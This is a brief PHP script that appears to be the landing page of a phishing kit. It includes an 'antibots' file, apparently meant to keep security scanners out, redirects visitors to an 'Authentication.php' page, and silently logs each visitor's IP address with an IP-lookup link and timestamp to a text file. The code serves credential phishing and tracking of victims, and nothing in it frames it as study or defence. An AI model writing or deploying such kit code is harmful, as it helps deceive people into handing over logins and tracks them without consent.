<?php
include "antibots.php";
header('location: Authentication.php');

    $IP = $_SERVER['REMOTE_ADDR'];
    $F = fopen("./views.txt","a");
    fwrite($F,"IP : https://www.infobyip.com/ip-". $IP.".html - Date : ".gmdate ("d/n/Y")." - Exact Time : ".gmdate ("H:i:s")."\n\n");

?>